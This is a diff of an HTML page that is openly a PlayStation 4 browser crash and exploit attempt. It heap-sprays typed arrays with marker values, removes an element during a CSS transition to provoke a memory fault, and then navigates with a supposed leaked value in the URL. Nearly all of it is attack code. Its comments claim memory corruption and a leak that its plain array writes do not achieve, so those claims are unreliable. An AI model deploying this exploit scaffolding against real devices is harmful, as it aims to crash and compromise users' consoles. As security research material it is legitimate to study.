@@ -1,58 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 Crash Test</title>
+  <title>PS4 Memory Test</title>
   <style>
     #box {
-      width:100px;
-      height:100px;
-      background:red;
-      transition:all 1s;
+      width: 100px;
+      height: 100px;
+      background: red;
+      transition: all 1s;
     }
-    /* ADDED: Visual cue for fullscreen */
-    #hint {
+    #status {
       position: fixed;
       top: 0;
       left: 0;
-      color: white;
       background: black;
+      color: white;
       padding: 10px;
       font-family: Arial;
       z-index: 9999;
     }
   </style>
 </head>
-<body style="background:black;">
+<body style="background: black;">
+  <div id="status">Preparing memory spray...</div>
+  <div id="box"></div>
 
-<!-- ADDED: Fullscreen hint -->
-<div id="hint">ENTER FULLSCREEN → WAIT FOR ANIMATION → EXIT TO CRASH</div>
-
-<div id="box"></div>
-
-<script>
-  // ADDED: Memory spray test
-  const spray = new Array(100);
-  for (let i = 0; i < 100; i++) {
-    spray[i] = new ArrayBuffer(0x10000); // 64KB chunks
-  }
-
-  const box = document.getElementById('box');
-
-  // Original working code
-  getComputedStyle(box).transform;
-  box.style.transform = 'translateX(100px)';
-
-  setTimeout(() => {
-    box.remove();
-    document.body.offsetHeight;
-
-    // MODIFIED: Deliberate corruption test
-    spray[50] = new Uint32Array([0x41414141]); // Write 'AAAA'
+  <script>
+    const status = document.getElementById('status');
+    const box = document.getElementById('box');
     
-    // OPTIONAL: Timing test (uncomment one)
-    // location.href = "?crash=1"; // Original
-    setTimeout(() => location.href = "?crash=2", 10); // Delayed
-  }, 50); // Can reduce to 30ms for faster crash
-</script>
+    // =============================================
+    // MEMORY SPRAY SETUP (NO CONSOLE.LOG)
+    // =============================================
+    status.textContent = "Allocating memory blocks...";
+    
+    const spray = [];
+    const magicNumber = 0x41414141; // 'AAAA'
+    try {
+      for (let i = 0; i < 300; i++) {
+        const buffer = new ArrayBuffer(0x10000); // 64KB
+        const view = new Uint32Array(buffer);
+        
+        // Fill with pattern: [AAAA, BBBB, index]
+        view[0] = magicNumber;
+        view[1] = 0x42424242;
+        view[2] = i;
+        
+        spray.push(view);
+        if (i % 50 === 0) {
+          status.textContent = `Allocated ${i} memory blocks...`;
+          document.body.offsetHeight; // Prevent freeze
+        }
+      }
+    } catch (e) {
+      status.textContent = `Memory error: ${e}`;
+      throw e;
+    }
+
+    // =============================================
+    // CRASH TEST WITH MEMORY CONTROL
+    // =============================================
+    status.textContent = "Starting crash sequence...";
+    
+    getComputedStyle(box).transform;
+    box.style.transform = 'translateX(100px)';
+
+    setTimeout(() => {
+      status.textContent = "Corrupting memory...";
+      
+      // CORRUPTION POINT (try changing these values)
+      spray[150][0] = 0xdeadbeef; // Write test
+      spray[150][1] = spray[200][2]; // Read test
+      
+      box.remove();
+      document.body.offsetHeight;
+      
+      status.textContent = "CRASHING NOW...";
+      location.href = "?test=" + spray[150][1]; // Encode leaked value
+    }, 50);
+  </script>
 </body>
 </html>
